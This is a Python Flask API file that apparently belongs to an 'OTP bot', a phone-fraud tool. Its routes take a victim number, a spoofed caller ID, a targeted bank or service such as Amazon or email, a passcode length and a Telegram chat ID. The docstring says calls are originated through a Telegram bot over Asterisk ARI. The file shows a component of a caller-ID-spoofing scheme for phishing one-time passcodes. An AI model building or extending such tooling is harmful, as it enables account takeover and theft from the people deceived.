"""
Flask API — health + optional HTTP bridge.

Primary telephony events are handled via ARI WebSocket (sip_call_manager.py),
not Telnyx-style POST webhooks. Routes below mirror old URL shapes for
documentation/testing only; production uses Stasis + channel variables.
"""

from __future__ import annotations

import logging

from flask import Flask, jsonify, request

from call_flows import FlowDispatcher
from sip_call_manager import AriCallManager, manager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
dispatcher: FlowDispatcher | None = None


def _on_ari_event(event_type: str, ctx, payload: dict) -> None:
    if dispatcher:
        try:
            dispatcher.handle(event_type, ctx, payload)
        except Exception:
            logger.exception("Flow handler error")


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "ari": manager is not None})


@app.route("/voice/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>", methods=["POST"])
@app.route("/pin/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>", methods=["POST"])
@app.route("/bank/<number>/<spoof>/<bank>/<name>/<otpdigits>/<chatid>/<tag>", methods=["POST"])
@app.route("/email/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>", methods=["POST"])
@app.route("/amazon/<number>/<spoof>/<service>/<name>/<otpdigits>/<chatid>/<tag>", methods=["POST"])
@app.route(
    "/custom/<number>/<spoof>/<service>/<name>/<otpdigits>/<sid>/<chatid>/<tag>",
    methods=["POST"],
)
def legacy_webhook_compat(**kwargs):
    """
    Telnyx sent events here; with SIP+ARI events come over WebSocket.
    This endpoint returns 410 with instructions.
    """
    return (
        jsonify(
            {
                "error": "deprecated",
                "message": "Use ARI Stasis app; originate via Telegram bot. "
                "HTTP per-event webhooks are not used in SIP mode.",
            }
        ),
        410,
    )


def init_ari() -> AriCallManager:
    global manager, dispatcher
    m = AriCallManager(on_event=_on_ari_event)
    m.start()
    dispatcher = FlowDispatcher(m)
    import sip_call_manager as scm

    scm.manager = m
    return m


if __name__ == "__main__":
    init_ari()
    app.run(host="0.0.0.0", port=5000, debug=False)
